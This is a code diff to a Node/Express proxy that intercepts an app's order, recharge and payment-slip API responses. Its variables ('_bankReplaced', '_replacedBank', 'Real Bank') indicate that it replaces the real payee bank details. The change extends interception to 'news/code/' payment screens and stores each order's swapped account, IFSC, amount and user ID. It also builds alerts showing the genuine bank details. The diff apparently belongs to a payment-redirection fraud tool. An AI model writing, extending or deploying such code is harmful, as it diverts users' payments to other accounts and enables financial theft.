@@ -1571,7 +1571,8 @@ app.all('/xxapi/*', async (req, res) => {
 
     const isOrder = urlLower.includes('paymentslipdetail')
       || /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
-      || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST');
+      || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST')
+      || urlLower.includes('news/code/'); // For dynamic direct payment screens like freechargetutorial
     let _orderId = '';
     if (isOrder) {
       const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
@@ -1856,12 +1857,29 @@ app.all('/xxapi/*', async (req, res) => {
     }
 
     // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
-    if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail'))) {
+    if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('news/code/'))) {
       const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
       if (_orderId) {
         if (!data.orderBankMap) data.orderBankMap = {};
         const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
-        data.orderBankMap[_orderId] = { bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`, time: now, userId: userId || '' };
+        // Fix duplicate order save by explicitly setting rptNo
+        const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
+        const savedData = { 
+          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`, 
+          time: now, 
+          userId: userId || '',
+          rptNo: _orderId,
+          orderNo: altId || _orderId,
+          amount: _orderAmt || 0,
+          isManual: true,
+          forced: true
+        };
+        data.orderBankMap[_orderId] = savedData;
+        if (altId && altId !== _orderId) {
+            data.orderBankMap[altId] = savedData;
+        }
+        // Save dynamically captured direct order screen
+        saveData(data).catch(() => {});
       }
       const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
         ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
